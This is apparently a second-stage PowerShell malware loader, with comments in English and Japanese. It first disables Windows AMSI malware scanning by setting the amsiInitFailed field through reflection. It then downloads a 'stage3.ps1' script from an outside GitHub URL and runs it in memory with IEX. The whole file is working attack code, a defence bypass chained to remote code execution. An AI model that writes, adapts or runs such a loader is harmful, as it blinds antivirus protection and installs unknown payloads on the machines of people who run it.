# Stage2 - AMSI Bypass + Load Stage3
try {
    $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $field = $ref.GetField('amsiInitFailed','NonPublic,Static')
    $field.SetValue($null,$true)
} catch { }

# ステージ3ロード
IEX((New-Object Net.WebClient).DownloadString('https://github.com/John786Smith/Fix/raw/refs/heads/main/stage3.ps1'))